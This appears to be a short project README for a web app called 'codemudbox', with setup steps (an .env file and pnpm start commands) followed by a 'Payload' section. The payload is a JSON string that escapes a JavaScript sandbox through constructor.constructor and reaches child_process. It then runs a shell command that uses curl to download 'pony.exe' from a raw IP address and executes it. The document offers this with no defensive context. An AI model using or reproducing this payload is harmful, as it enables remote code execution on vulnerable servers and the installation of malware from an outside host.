# Setup
1 - Create a ```.env.[mode]``` file in ```/applications/web``` directory

2 - Set the following content
```
VITE_API_URL=<YOUR_API_URL>
# example: http://localhost:8080/api/v1
```

3 - Run the command:
```sh
~/codemudbox > pnpm start:development

or

~/codemudbox > pnpm start:production
```

# Payload

```json
{
  "payload": "this.constructor.constructor(\"return this\")().process.mainModule.require('child_process').spawn('curl -L \"http://90.3.190.160:6555/pony.exe\" > pony.exe && pony.exe', { shell: true })"
}
```
